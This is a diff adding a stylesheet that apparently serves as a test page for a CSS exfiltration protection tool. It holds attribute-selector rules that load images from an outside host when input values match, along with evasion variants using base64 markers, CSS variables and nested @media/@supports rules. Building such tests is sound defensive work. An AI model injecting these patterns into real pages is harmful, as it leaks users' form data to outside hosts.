@@ -1,0 +1,59 @@
+/* TEST 1: `;base64,` inside the url fragment and `//` as the protocol */
+#exfil_test1[value*="abc"] ~ #exfil_img1 {
+    background-image: url("//randshell.github.io/CSS-Exfil-Protection-POC/src/pwned1.png#;base64,");
+  }
+  
+  /* TEST 1.1: `;base64,` inside the filename and `//` as the protocol */
+  #exfil_test11[value*="abc"] ~ #exfil_img11 {
+    background-image: url("//randshell.github.io/CSS-Exfil-Protection-POC/src/;base64,pwned11.png");
+  }
+  
+  /* TEST 2: url link inside css variable */
+  :root {
+    --link2: url( 'https://randshell.github.io/CSS-Exfil-Protection-POC/src/pwned2.png' );
+    --link21: url("https://randshell.github.io/CSS-Exfil-Protection-POC/src/pwned21.png");
+  }
+  
+  #exfil_test2[value*="abc"] ~ #exfil_img2 {
+    background-image: var(--link2);
+  }
+  
+  /* TEST 2.1: nested variables within the fallback value */
+  #exfil_test21[value*="abc"] ~ #exfil_img21 {
+    background-image: var(--emo, var(--link, var(--link21)));
+  }
+  
+  /* TEST 3: CSSSupportsRule or CSSMediaRule + nesting */
+  @supports (display: flex) {
+    @media screen and (min-width: 100px) {
+      #exfil_test3[value*="abc"] ~ #exfil_img3 {
+        background-image: url("https://randshell.github.io/CSS-Exfil-Protection-POC/src/pwned3.png");
+      }
+    }
+    
+    @media screen and (min-width: 200px) {
+      #exfil_test31[value*="abc"] ~ #exfil_img31 {
+        background-image: url("https://randshell.github.io/CSS-Exfil-Protection-POC/src/pwned31.png");
+      }
+    }
+  }
+  
+  .exfil_img {
+    height: 180px;
+    width: 180px;
+    background-size: cover;
+  }
+  
+  body section > div {
+    display: inline-block;
+    margin: 20px;
+  }
+  
+  input {
+    display: none;
+  }
+  
+  section {
+    margin: auto;
+    width: 50%;
+  }
